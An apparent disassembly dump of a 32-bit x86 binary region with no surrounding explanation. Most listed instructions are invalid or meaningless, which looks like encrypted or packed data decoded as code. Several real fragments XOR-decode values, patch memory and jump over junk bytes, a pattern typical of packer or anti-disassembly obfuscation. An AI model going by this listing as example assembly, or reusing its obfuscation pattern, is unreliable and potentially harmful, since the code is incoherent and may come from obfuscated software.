  40b5d0:	mov    edi,0xfda20eed
  40b5d5:	xor    DWORD PTR [esi+0x4e],eax
  40b5d8:	xor    eax,0x3f6495a7
  40b5dd:	xchg   esp,eax
  40b5de:	sub    ecx,DWORD PTR [ecx+0x18f1cc8b]
  40b5e4:	cld    
  40b5e5:	and    DWORD PTR [eax+0x21f659f0],0x61
  40b5ec:	mov    ch,0x8a
  40b5ee:	sub    eax,0xc4f6c485
  40b5f3:	aaa    
  40b5f4:	mov    dh,0xbb
  40b5f6:	aaa    
  40b5f7:	cmp    BYTE PTR [edi],dh
  40b5f9:	push   eax
  40b5fa:	cmp    bh,bl
  40b5fc:	ja     0x40b64f
  40b5fe:	call   0xcbd3f5b6
  40b603:	inc    DWORD PTR fs:[esi+0x1780b3c5]
  40b60a:	xor    esp,DWORD PTR [esi+0x45]
  40b60d:	scas   al,BYTE PTR es:[edi]
  40b60e:	mov    BYTE PTR [eax],bh
  40b610:	jmp    0x6fa5:0xd98cfd2c
  40b617:	mov    edx,0xa53f17fe
  40b61c:	fwait
  40b61d:	add    edi,esi
  40b61f:	in     eax,dx
  40b620:	loope  0x40b694
  40b622:	(bad)  
  40b623:	push   esi
  40b624:	cmp    al,0x53
  40b626:	push   esp
  40b627:	inc    ecx
  40b628:	dec    esp
  40b629:	fucomip st,st(6)
  40b62b:	xchg   edx,eax
  40b62c:	push   eax
  40b62d:	mov    ebp,0x4a8f02a6
  40b632:	dec    edi
  40b633:	or     DWORD PTR [esi],eax
  40b635:	shl    BYTE PTR [edi-0x33],1
  40b638:	fdiv   QWORD PTR [edx-0x2cd1f5d8]
  40b63e:	pop    eax
  40b63f:	enter  0xbf07,0x4
  40b643:	add    BYTE PTR [ebx-0x21d46da1],dl
  40b649:	call   0x48198023
  40b64e:	cld    
  40b64f:	inc    BYTE PTR [edx-0x5c]
  40b652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b653:	xor    edi,DWORD PTR [ebx+0x7b5d981f]
  40b659:	adc    eax,0xb6c187c5
  40b65e:	in     eax,0x6c
  40b660:	mov    dh,0x78
  40b662:	icebp  
  40b663:	cld    
  40b664:	shr    BYTE PTR [esi],cl
  40b666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b667:	push   ss
  40b668:	jmp    0x9ad2:0xa9d5ccf3
  40b66f:	(bad)  
  40b670:	scas   al,BYTE PTR es:[edi]
  40b671:	ins    BYTE PTR es:[edi],dx
  40b672:	ins    BYTE PTR es:[edi],dx
  40b673:	mov    al,0x88
  40b675:	rep outs dx,BYTE PTR ds:[esi]
  40b677:	and    BYTE PTR [ecx+0x34],al
  40b67a:	imul   eax,DWORD PTR [esi-0x30aa7f8e],0xfffffffb
  40b681:	mov    eax,0xe6a678b1
  40b686:	pop    edx
  40b687:	(bad)  
  40b688:	(bad)  
  40b689:	int3   
  40b68a:	fisub  DWORD PTR [ebx]
  40b68c:	jecxz  0x40b646
  40b68e:	aaa    
  40b68f:	ror    BYTE PTR [esi+0xba789c7],1
  40b695:	out    dx,al
  40b696:	sbb    bh,cl
  40b698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b699:	(bad)  
  40b69a:	cld    
  40b69b:	idiv   BYTE PTR [ebp+0x34]
  40b69e:	jge    0x40b63f
  40b6a0:	out    dx,eax
  40b6a1:	out    dx,al
  40b6a2:	add    ebp,DWORD PTR [eax+0x9]
  40b6a5:	xlat   BYTE PTR ds:[ebx]
  40b6a6:	dec    ecx
  40b6a7:	mov    dh,0x25
  40b6a9:	lods   eax,DWORD PTR ds:[esi]
  40b6aa:	adc    DWORD PTR [ebx-0x2a],ecx
  40b6ad:	jecxz  0x40b688
  40b6af:	cwde   
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x74
  40b6da:	inc    ebx
  40b6db:	jmp    0x40b6ee
  40b6dd:	fptan  
  40b6df:	jle    0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b6e7
  40b6e6:	jno    0x40b763
  40b6e8:	inc    eax
  40b6e9:	out    dx,al
  40b6ea:	mov    al,ds:0xbf3b4234
  40b6ef:	sbb    bh,BYTE PTR [ebp+0x26]
  40b6f2:	in     al,0xd8
  40b6f4:	je     0x40b6b4
  40b6f6:	cmp    al,0x9a
  40b6f8:	clc    
  40b6f9:	fistp  DWORD PTR [edi-0x7c7c0488]
  40b6ff:	(bad)  
  40b700:	fdivr  QWORD PTR [ecx]
  40b702:	mov    ebp,0x7c91d9fd
  40b707:	lods   eax,DWORD PTR ds:[esi]
  40b708:	or     DWORD PTR [edx],esp
  40b70a:	sub    dl,BYTE PTR [esi-0x2b]
  40b70d:	shl    DWORD PTR ds:0x20235fbf,1
  40b713:	cld    
  40b714:	or     eax,0xfeab0677
  40b719:	imul   ebx,DWORD PTR [eax-0x7e],0xffffffd2
  40b71d:	test   BYTE PTR [edx-0x778698fa],0x2c
  40b724:	sbb    edi,DWORD PTR [ecx]
  40b726:	sub    bl,0xe
  40b729:	stos   DWORD PTR es:[edi],eax
  40b72a:	cmp    al,0xd7
  40b72c:	arpl   WORD PTR ds:0x8c5cd697,sp
  40b732:	dec    ebx
  40b733:	call   0x8f99a0cc
  40b738:	shl    DWORD PTR [ebp+0x6d856b0e],cl
  40b73e:	push   edi
  40b73f:	cwde   
  40b740:	inc    edx
  40b741:	dec    ebp
  40b742:	fdiv   st,st(0)
  40b744:	nop
  40b745:	and    al,0x6e
  40b747:	cmc    
  40b748:	sub    al,0x16
  40b74a:	and    al,0xbc
  40b74c:	(bad)
  40b74f:	sbb    al,0x15
  40b751:	mov    bp,0x4989
  40b755:	adc    eax,DWORD PTR [edi-0x129cff35]
  40b75b:	dec    eax
  40b75c:	xlat   BYTE PTR ds:[ebx]
  40b75d:	mov    BYTE PTR [edi+ecx*1+0x38bb5b50],dh
  40b764:	add    ecx,edx
  40b766:	clc    
  40b767:	jno    0x40b79f
  40b769:	das    
  40b76a:	out    0x3e,eax
  40b76c:	inc    edx
  40b76d:	repnz pop ds
  40b76f:	pop    ss
  40b770:	sbb    ebx,DWORD PTR [ebx+ecx*1+0x1316cbe9]
  40b777:	mov    dl,0x87
  40b779:	out    0xb8,eax
  40b77b:	into   
  40b77c:	dec    eax
  40b77d:	stos   BYTE PTR es:[edi],al
  40b77e:	pop    eax
  40b77f:	ror    BYTE PTR [edx+0x2ab71df2],0xbc
  40b786:	mov    ah,0xc3
  40b788:	mov    bl,BYTE PTR [eax-0xa]
  40b78b:	scas   al,BYTE PTR es:[edi]
  40b78c:	xchg   ebx,eax
  40b78d:	or     bh,BYTE PTR [esi]
  40b78f:	jmp    0x40b774
  40b791:	bound  ebx,QWORD PTR [eax+0x2b]
  40b794:	mov    dh,0xca
  40b796:	sahf   
  40b797:	ret    0x46e
  40b79a:	sbb    BYTE PTR ds:0x8b6046e7,bl
  40b7a0:	pop    ebp
  40b7a1:	enter  0x5d00,0x1d
  40b7a5:	pop    eax
  40b7a6:	xchg   edi,eax
  40b7a7:	int3   
  40b7a8:	pop    edi
  40b7a9:	icebp  
  40b7aa:	(bad)  
  40b7ab:	jnp    0x40b7b0
  40b7ad:	dec    ecx
  40b7ae:	cdq    
  40b7af:	cmp    eax,0xb9c5478d
  40b7b4:	jle    0x40b812
  40b7b6:	add    ecx,edi
  40b7b8:	jo     0x40b766
  40b7ba:	lea    esi,[eax+0x77]
  40b7bd:	test   al,0x92
  40b7bf:	retf   0x40e5
  40b7c2:	ror    ebp,0x9e
  40b7c5:	loopne 0x40b827
  40b7c7:	mov    ah,0xaa
  40b7c9:	(bad)  
  40b7ca:	jne    0x40b79c
  40b7cc:	sbb    al,0x67
  40b7ce:	mov    ah,BYTE PTR [edx+0x76]
  40b7d1:	in     eax,0x58
  40b7d3:	js     0x40b822
  40b7d5:	sub    BYTE PTR [eax],dh
  40b7d7:	pushf  
  40b7d8:	fwait
  40b7d9:	xchg   BYTE PTR [ebx-0x5659b5d9],al
  40b7df:	ins    BYTE PTR es:[edi],dx
  40b7e0:	shr    BYTE PTR [ebx],0x34
  40b7e3:	sub    BYTE PTR [ecx-0x778f8fa],ch
  40b7e9:	or     dl,ah
  40b7eb:	xor    BYTE PTR [ebp+0x91de892],ah
  40b7f1:	sub    ah,BYTE PTR [ebp-0x1c]
  40b7f4:	retf   0x3731
  40b7f7:	sub    ebx,DWORD PTR [eax]
  40b7f9:	or     bl,al
  40b7fb:	sub    BYTE PTR [esi],0xca
  40b7fe:	xor    ebp,esi
  40b800:	leave  
  40b801:	loopne 0x40b7ff
  40b803:	push   esp
  40b804:	adc    bh,BYTE PTR [esi-0x6d277566]
  40b80a:	adc    eax,0xae8bd703
  40b80f:	into   
  40b810:	test   al,0x58
  40b812:	inc    edx
  40b813:	imul   edx,DWORD PTR [ebp+0x34],0xffffffca
  40b817:	push   cs
  40b818:	mov    ecx,0x3cfa306d
  40b81d:	or     DWORD PTR [edi+0x2f76c28d],0x63
  40b824:	sub    DWORD PTR [edx-0x6397f1aa],esi
  40b82a:	push   edi
  40b82b:	sbb    BYTE PTR [ebx-0x66],ah
  40b82e:	sahf   
  40b82f:	mov    esp,0xe9d9197d
  40b834:	jne    0x40b7fd
  40b836:	cmp    ch,dh
  40b838:	(bad)  
  40b839:	ds mul esi
  40b83c:	jecxz  0x40b891
  40b83e:	test   BYTE PTR [ecx+0x43a7a863],cl
  40b844:	add    BYTE PTR [ebx],bh
  40b846:	cmp    DWORD PTR [edi-0x6b],ecx
  40b849:	nop
  40b84a:	push   es
  40b84b:	inc    esp
  40b84c:	mov    ds:0x236636dc,eax
  40b851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b852:	addr16 jbe 0x40b845
  40b855:	jl     0x40b825
  40b857:	ss push edx
  40b859:	mov    ebp,0xed44f5a7
  40b85e:	sbb    al,0xbb
  40b860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b861:	call   FWORD PTR [edi]
  40b863:	push   0x3f
  40b865:	test   eax,0xbdd9132e
  40b86a:	arpl   WORD PTR [eax],si
  40b86c:	fld    QWORD PTR [edx+ebx*4]
  40b86f:	mov    ch,0xe9
  40b871:	fisub  DWORD PTR [esi-0x32]
  40b874:	dec    BYTE PTR [edx-0x67]
  40b877:	div    esp
  40b879:	inc    edx
  40b87a:	in     al,0xe2
  40b87c:	test   DWORD PTR [edi],0xac28d24d
  40b882:	and    dh,BYTE PTR [edi+eax*8]
  40b885:	dec    edi
  40b886:	cmp    BYTE PTR gs:[ecx-0x52],dh
  40b88a:	idiv   BYTE PTR [ebx-0x25]
  40b88d:	ss mov ch,0x80
  40b890:	xchg   edi,eax
  40b891:	xchg   esp,eax
  40b892:	xor    al,0xe5
  40b894:	inc    eax
  40b895:	mov    ebp,0x1f5a7a44
  40b89a:	loop   0x40b849
  40b89c:	mov    edi,0x7eb93d06
  40b8a1:	adc    ah,BYTE PTR [eax+0x20]
  40b8a4:	or     BYTE PTR [ebp+0x47],al
  40b8a7:	push   ds
  40b8a8:	lods   al,BYTE PTR ds:[esi]
  40b8a9:	ins    DWORD PTR es:[edi],dx
  40b8aa:	test   al,0xd3
  40b8ac:	lods   eax,DWORD PTR ds:[esi]
  40b8ad:	mov    ds:0x8b00b7b5,al
  40b8b2:	jae    0x40b881
  40b8b4:	in     eax,dx
  40b8b5:	cmp    eax,0x3ace4c2d
  40b8ba:	fneni(8087 only) 
  40b8bc:	dec    edi
  40b8bd:	jmp    0x40b924
  40b8bf:	inc    edx
  40b8c0:	jbe    0x40b924
  40b8c2:	inc    esi
  40b8c3:	pop    es
  40b8c4:	xchg   BYTE PTR ds:[edi+0x7f2b0154],bl
  40b8cb:	and    DWORD PTR [ecx-0x3b98f25a],edi
  40b8d1:	add    BYTE PTR [esi+0x60],dh
  40b8d4:	das    
  40b8d5:	jns    0x40b85c
  40b8d7:	div    DWORD PTR [ecx-0xf]
  40b8da:	and    al,0x81
  40b8dc:	ins    BYTE PTR es:[edi],dx
  40b8dd:	test   al,0x9f
  40b8df:	fadd   DWORD PTR [ebx]
  40b8e1:	mov    eax,0x8a9cf45e
  40b8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e7:	mov    ebx,0xfa7b76e9
  40b8ec:	and    al,0x82
  40b8ee:	jo     0x40b87b
  40b8f0:	xchg   BYTE PTR [eax+0x40],dl
  40b8f3:	pop    ebp
  40b8f4:	jo     0x40b8a0
  40b8f6:	je     0x40b88b
  40b8f8:	leave  
  40b8f9:	xchg   ebp,eax
  40b8fa:	xlat   BYTE PTR ds:[ebx]
  40b8fb:	mov    BYTE PTR [ebx-0x4ca4648e],ch
  40b901:	retf   0x8a3d
  40b904:	mov    WORD PTR [esi],ds
  40b906:	dec    esp
  40b907:	dec    eax
  40b908:	scas   eax,DWORD PTR es:[edi]
  40b909:	rcr    DWORD PTR [edi-0x55],0xa4
  40b90d:	test   BYTE PTR [ecx+0x6e],ah
  40b910:	push   es
  40b911:	jne    0x40b91f
  40b913:	popf   
  40b914:	xor    edi,DWORD PTR [ebp+0x7758aeca]
  40b91a:	lock push es
  40b91c:	int3   
  40b91d:	inc    ebp
  40b91e:	sub    eax,0x180022ae
  40b923:	and    edx,DWORD PTR [eax]
  40b925:	sub    DWORD PTR [esp+ebx*1],ebp
  40b928:	sbb    BYTE PTR ds:0xab901cf1,dl
  40b92e:	cmp    dh,dh
  40b930:	add    ebp,DWORD PTR [ebp+edx*8+0x4a055c72]
  40b937:	mov    bl,BYTE PTR [ebp+0xbd89aa0]
  40b93d:	dec    edx
  40b93e:	fwait
  40b93f:	ins    DWORD PTR es:[edi],dx
  40b940:	push   cs
  40b941:	jge    0x40b8cd
  40b943:	addr16 inc ecx
  40b945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b946:	stos   DWORD PTR es:[edi],eax
  40b947:	retf   0x7aa2
  40b94a:	das    
  40b94b:	mov    bh,0x32
  40b94d:	mov    DWORD PTR [esi+0x2022dba5],esi
  40b953:	add    dl,BYTE PTR [eax+0x11]
  40b956:	cdq    
  40b957:	jb     0x40b8df
  40b959:	fneni(8087 only) 
  40b95b:	mov    dh,0x32
  40b95d:	syscall 
  40b95f:	mov    ch,BYTE PTR [edi]
  40b961:	inc    edx
  40b962:	aam    0x89
  40b964:	sub    BYTE PTR [edi-0x49],bl
  40b967:	push   esp
  40b968:	and    eax,0x4050f464
  40b96d:	push   esi
  40b96e:	es ret 
  40b970:	lods   al,BYTE PTR ds:[esi]
  40b971:	les    esi,FWORD PTR [eax]
  40b973:	mul    BYTE PTR [ecx-0x74]
  40b976:	inc    esi
  40b977:	adc    ebx,DWORD PTR [eax+eiz*4]
  40b97a:	leave  
  40b97b:	cmp    al,0xc7
  40b97d:	pop    edi
  40b97e:	sbb    BYTE PTR [eax-0x2936651a],al
  40b984:	pop    ebp
  40b985:	adc    DWORD PTR [eax-0x4b],0xa43b9a81
  40b98c:	xchg   edx,eax
  40b98d:	in     eax,dx
  40b98e:	ror    DWORD PTR [edx-0x196ee0ce],1
  40b994:	pushf  
  40b995:	dec    ecx
  40b996:	imul   eax,edx,0x3da86856
  40b99c:	ins    BYTE PTR es:[edi],dx
  40b99d:	(bad)  
  40b99f:	adc    al,0xd8
  40b9a1:	enter  0xa70a,0xc2
  40b9a5:	push   0x4f
  40b9a7:	hlt    
  40b9a8:	push   ds
  40b9a9:	pop    esp
  40b9aa:	pop    esi
  40b9ab:	add    al,0x13
  40b9ad:	inc    edx
  40b9ae:	mov    bh,0x4
  40b9b0:	frstor [edi+esi*8]
  40b9b3:	sti    
  40b9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b5:	mov    eax,0xec3fc32d
  40b9ba:	repnz inc ebp
  40b9bc:	mov    bh,0x8a
  40b9be:	add    BYTE PTR [eax+0x7acece65],ch
  40b9c4:	loopne 0x40b96d
  40b9c6:	and    eax,0x8af0a78d
  40b9cb:	pop    esi
  40b9cc:	or     BYTE PTR [edx],0x8d
  40b9cf:	jecxz  0x40b9c9
  40b9d1:	into   
  40b9d2:	sub    DWORD PTR [edx+edx*4-0x43c378e],edi
  40b9d9:	scas   al,BYTE PTR es:[edi]
  40b9da:	into   
  40b9db:	pop    edx
  40b9dc:	nop
  40b9dd:	cmc    
  40b9de:	cmp    ebp,edi
  40b9e0:	inc    edx
  40b9e1:	repz cmp eax,0x25fdca76
  40b9e7:	int    0xf3
  40b9e9:	int3   
  40b9ea:	xor    eax,0x638d130b
  40b9ef:	and    DWORD PTR [eax+edi*8],0xffffffa0
  40b9f3:	jmp    0x40ba4b
  40b9f5:	and    DWORD PTR [ebp-0x1d],0xf6c09b1d
  40b9fc:	cwde   
  40b9fd:	cmp    bl,BYTE PTR [edi+0x71]
  40ba00:	push   edi
  40ba01:	cmp    ch,BYTE PTR [ebx+0x16]
  40ba04:	xor    al,0x80
  40ba06:	data16 cmc 
  40ba08:	nop
  40ba09:	ret    0xed29
  40ba0c:	iret   
  40ba0d:	out    0x11,al
  40ba0f:	call   0x279435b1
  40ba14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	dec    ecx
  40ba36:	and    al,0x35
  40ba38:	xor    DWORD PTR [ecx+0x2e7e7ef1],ecx
  40ba3e:	jge    0x40babe
  40ba40:	jle    0x40b9f3
  40ba42:	(bad)  
  40ba44:	imul   ebp,DWORD PTR [eax+0x2a],0xf4370fd5
  40ba4b:	or     ah,cl
  40ba4d:	pop    ds
  40ba4e:	sub    eax,0x5680db21
  40ba53:	xchg   edi,eax
  40ba54:	or     al,BYTE PTR [ebp-0x23]
  40ba57:	sar    BYTE PTR [edx+0x77],cl
  40ba5a:	or     bl,BYTE PTR [edx]
  40ba5c:	jge    0x40bac0
  40ba5e:	mov    dl,BYTE PTR [eax-0x6696e4e9]
  40ba64:	sbb    al,0x24
  40ba66:	pop    esi
  40ba67:	clc    
  40ba68:	fsubr  QWORD PTR [ecx-0x59]
  40ba6b:	xchg   DWORD PTR [ebp+0x8],ebx
  40ba6e:	daa    
  40ba6f:	push   edi
  40ba70:	xchg   edi,eax
  40ba71:	imul   ebx,DWORD PTR [ebx+0x9],0x1f
  40ba75:	mov    WORD PTR gs:[eax-0x8228dd2],?
  40ba7c:	xor    eax,0xfffffff8
  40ba7f:	sbb    eax,0x1053d90e
  40ba84:	sbb    dh,BYTE PTR [ebx]
  40ba86:	adc    DWORD PTR [edi],0x9ff18871
  40ba8c:	sti    
  40ba8d:	int    0x28
  40ba8f:	into   
  40ba90:	xor    eax,0x8d2b20f3
  40ba95:	mov    ah,0xc0
  40ba97:	imul   DWORD PTR [eax-0x549aac78]
  40ba9d:	inc    ebp
  40ba9e:	(bad)  
  40ba9f:	xor    ecx,ecx
  40baa1:	mov    cl,0x68
  40baa3:	out    dx,eax
  40baa4:	push   edx
  40baa5:	adc    DWORD PTR [ecx+0x1fbadbc],eax
  40baab:	mov    ?,ebx
  40baad:	sub    BYTE PTR [esi-0x2],dh
  40bab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab1:	xchg   ebp,eax
  40bab2:	sbb    eax,0x2008b952
  40bab7:	xor    eax,0xcf4e589b
  40babc:	push   eax
  40babd:	jle    0x40baeb
  40babf:	push   ebp
  40bac0:	shl    dl,1
  40bac2:	dec    eax
  40bac3:	cmp    bh,cl
  40bac5:	inc    edi
  40bac6:	cdq    
  40bac7:	dec    ebx
  40bac8:	push   ss
  40bac9:	in     al,dx
  40baca:	mov    bh,BYTE PTR [edx-0x69cbe349]
  40bad0:	std    
  40bad1:	sbb    esi,DWORD PTR [eax+0x3]
  40bad4:	mov    ah,dl
  40bad6:	scas   al,BYTE PTR es:[edi]
  40bad7:	add    ch,BYTE PTR [edi+0xcf7989c]
  40badd:	inc    eax
  40bade:	push   esp
  40badf:	popf   
  40bae0:	addr16 push ds
  40bae2:	test   DWORD PTR [esp+ebx*4],esp
  40bae5:	aad    0x57
  40bae7:	addr16 cmp eax,0x289a5a69
  40baed:	pop    esp
  40baee:	ss mov bh,0x36
  40baf1:	add    DWORD PTR [eax+0x6ec60da1],edi
  40baf7:	jp     0x40ba96
  40baf9:	push   esi
  40bafa:	mov    eax,0xc2b1c193
  40baff:	push   ss
  40bb00:	dec    edi
  40bb01:	imul   esp,DWORD PTR [esi+0x777085c4],0xffffff84
  40bb08:	inc    eax
  40bb09:	in     eax,dx
  40bb0a:	xor    esi,DWORD PTR [edx-0x27153afd]
  40bb10:	pop    ss
  40bb11:	xchg   ebx,eax
  40bb12:	retf   
  40bb13:	test   DWORD PTR [esp+ebx*8+0x70],eax
  40bb17:	sbb    BYTE PTR [edx-0x2a],ah
  40bb1a:	fucomip st,st(7)
  40bb1c:	sbb    dl,BYTE PTR [ebx+0x1c]
  40bb1f:	int    0x61
  40bb21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb22:	add    eax,0xaed9ba49
  40bb27:	dec    eax
  40bb28:	jb     0x40bb8c
  40bb2a:	xchg   ecx,eax
  40bb2b:	lods   eax,DWORD PTR ds:[esi]
  40bb2c:	adc    DWORD PTR [ecx-0x61],eax
  40bb2f:	inc    edx
  40bb30:	xchg   esi,eax
  40bb31:	ss hlt 
  40bb33:	sar    DWORD PTR [ecx+0x3294f8d9],0x6a
  40bb3a:	mov    ecx,0x31be6020
  40bb3f:	mov    eax,DWORD PTR [edi+0x417cccde]
  40bb45:	dec    edi
  40bb46:	sub    BYTE PTR [esi],0x85
  40bb49:	fs out dx,al
  40bb4b:	mov    ebp,0xdb684943
  40bb50:	jo     0x40bb34
  40bb52:	test   al,0x92
  40bb54:	(bad)  
  40bb55:	xchg   ecx,eax
  40bb56:	(bad)  
  40bb57:	das    
  40bb58:	xor    al,0xad
  40bb5a:	or     eax,0x1f1f4dd7
  40bb5f:	jne    0x40bb9b
  40bb61:	bound  esi,QWORD PTR [eax-0x5df780b4]
  40bb67:	sbb    DWORD PTR [ebp*1-0x6f621330],ebp
  40bb6e:	sahf   
  40bb6f:	cld    
  40bb70:	xor    al,0xe5
  40bb72:	bound  ebp,QWORD PTR [esi-0x49]
  40bb75:	adc    BYTE PTR ds:0xd239f649,0xa5
  40bb7c:	add    BYTE PTR [ebx],bl
  40bb7e:	fs call 0xe3ba:0x673132aa
  40bb86:	cmp    dh,0xa4
  40bb89:	inc    edi
  40bb8a:	cmp    eax,ebp
  40bb8c:	dec    ebp
  40bb8d:	jb     0x40bb5d
  40bb8f:	sbb    eax,0x698e6b4a
  40bb94:	cwde   
  40bb95:	xchg   BYTE PTR [edx-0x20ef4fae],bl
  40bb9b:	mov    dl,BYTE PTR [edx+0x6b739a26]
  40bba1:	adc    ebp,DWORD PTR es:[edx]
  40bba4:	mov    ds:0x9605d208,al
  40bba9:	nop
  40bbaa:	cs into 
  40bbac:	fistp  DWORD PTR es:[ecx]
  40bbaf:	jp     0x40bbab
  40bbb1:	mov    al,0x18
  40bbb3:	sbb    al,0x23
  40bbb5:	icebp  
  40bbb6:	ja     0x40bbab
  40bbb8:	dec    esp
  40bbb9:	sub    edx,DWORD PTR [edi+0x11adae55]
  40bbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc0:	dec    ebp
  40bbc1:	fs add dl,ah
  40bbc4:	cmp    bh,BYTE PTR [eax+0x44da761d]
  40bbca:	jno    0x40bc4b
  40bbcc:	pop    ss
  40bbcd:	jle    0x40bc23
  40bbcf:	mov    edi,0x1368fb21
  40bbd4:	xchg   esp,eax
  40bbd5:	xchg   edi,eax
  40bbd6:	lds    ebx,FWORD PTR [edi]
  40bbd8:	jmp    FWORD PTR [edi-0x4355796a]
  40bbde:	hlt    
  40bbdf:	jne    0x40bbbe
  40bbe1:	in     al,0x80
  40bbe3:	or     ebp,0x65
  40bbe6:	sub    BYTE PTR [ebp+0x309d2f6a],0x30
  40bbed:	or     cl,bh
  40bbef:	lahf   
  40bbf0:	jle    0x40bc28
  40bbf2:	shrd   ecx,ebp,cl
  40bbf5:	mov    esp,0x67fd858d
  40bbfa:	ja     0x40bb8f
  40bbfc:	ficom  WORD PTR [ebp-0x2b1b03ef]
  40bc02:	adc    bh,BYTE PTR [esi-0x4d]
  40bc05:	jmp    0x40bbb9
  40bc07:	fsub   st,st(3)
  40bc09:	std    
  40bc0a:	imul   ecx,DWORD PTR [ebx-0x1a],0x345c7b3f
  40bc11:	xor    edi,edx
  40bc13:	cmp    DWORD PTR [edi+0x6f],ecx
  40bc16:	and    eax,0x9f5ba9b7
  40bc1b:	push   eax
  40bc1c:	in     al,dx
  40bc1d:	cli    
  40bc1e:	ret    0xfc86
  40bc21:	shl    BYTE PTR [ebp-0x47c9dc75],0xf9
  40bc28:	sub    esp,DWORD PTR [eax+0xb985c2e]
  40bc2e:	outs   dx,DWORD PTR ds:[esi]
  40bc2f:	mov    ch,0x8b
  40bc31:	mov    ecx,0x70a0d8e8
  40bc36:	jns    0x40bc16
  40bc38:	mov    eax,0x7322bb48
  40bc3d:	push   esi
  40bc3e:	test   DWORD PTR [edi],0x819a9c2c
  40bc44:	call   0x765e:0x55533ace
  40bc4b:	jne    0x40bcbb
  40bc4d:	pop    eax
  40bc4e:	iret   
  40bc4f:	mov    ds:0xef5d47d,eax
  40bc54:	mov    al,ds:0x2e808527
  40bc59:	cdq    
  40bc5a:	aad    0x2d
  40bc5c:	xchg   ebp,eax
  40bc5d:	mov    ds:0x929e6fc0,al
  40bc62:	and    BYTE PTR [ebx+0x64fc7b8b],dh
  40bc68:	in     al,dx
  40bc69:	mov    esp,0x62e14857
  40bc6e:	sbb    DWORD PTR [esi],ebx
  40bc70:	inc    ebx
  40bc71:	push   ebx
  40bc72:	jbe    0x40bcb7
  40bc74:	test   DWORD PTR ss:[edx+0x4d24f62d],edx
  40bc7b:	pop    edx
  40bc7c:	xchg   BYTE PTR [eax+0x708af29b],al
  40bc82:	fs or  esi,ebx
  40bc85:	xchg   esp,eax
  40bc86:	loop   0x40bcd9
  40bc88:	jns    0x40bc57
  40bc8a:	cli    
  40bc8b:	(bad)  
  40bc8c:	fcom   DWORD PTR [edx]
  40bc8e:	mov    ebx,0xba459592
  40bc93:	add    BYTE PTR [esi+0x2b],dl
  40bc96:	pop    edi
  40bc97:	loope  0x40bc1b
  40bc99:	stc    
  40bc9a:	jmp    0xa664:0xea1dc7d5
  40bca1:	mov    bh,0x49
  40bca3:	and    BYTE PTR [esi+eiz*2-0xfd092b8],bh
  40bcaa:	shr    DWORD PTR [ebp+0x39],0x81
  40bcae:	out    0xfe,eax
  40bcb0:	nop
  40bcb1:	mov    eax,ds:0xbe598655
  40bcb6:	pop    ss
  40bcb7:	pop    edi
  40bcb8:	stc    
  40bcb9:	mov    al,0x48
  40bcbb:	push   eax
  40bcbc:	ret    
  40bcbd:	dec    edi
  40bcbe:	mov    dh,0x57
  40bcc0:	pop    edx
  40bcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc2:	cmp    edi,DWORD PTR [edi+0x63]
  40bcc5:	scas   al,BYTE PTR es:[edi]
  40bcc6:	push   ds
  40bcc7:	mov    bh,0x3a
  40bcc9:	cwde   
  40bcca:	or     BYTE PTR ds:0x3c46752d,cl
  40bcd0:	aad    0x87
  40bcd2:	jnp    0x40bc70
  40bcd4:	out    0xed,al
  40bcd6:	jmp    0x14f1:0x61391d9e
  40bcdd:	mov    bl,0x95
  40bcdf:	inc    ecx
  40bce0:	dec    eax
  40bce1:	cmc    
  40bce2:	pop    es
  40bce3:	fs jecxz 0x40bc6d
  40bce6:	cmp    al,0x5d
  40bce8:	adc    eax,0x5995ee96
  40bced:	(bad)  
  40bcee:	in     al,0xbd
  40bcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf1:	mov    eax,edi
  40bcf3:	dec    edx
  40bcf4:	adc    eax,esi
  40bcf6:	outs   dx,BYTE PTR ds:[esi]
  40bcf7:	arpl   WORD PTR [eax+esi*8],di
  40bcfa:	add    eax,0x26ce0499
  40bcff:	jns    0x40bd50
  40bd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd02:	out    0xc7,eax
  40bd04:	iret   
  40bd05:	pop    edx
  40bd06:	sbb    BYTE PTR [ebp-0x2a],0x16
  40bd0a:	mov    dh,0x61
  40bd0c:	(bad)  
  40bd0d:	clc    
  40bd0e:	idiv   BYTE PTR [esi+ebx*2-0x51]
  40bd12:	adc    al,0x66
  40bd14:	clc    
  40bd15:	sub    DWORD PTR [eax],esp
  40bd17:	icebp  
  40bd18:	cdq    
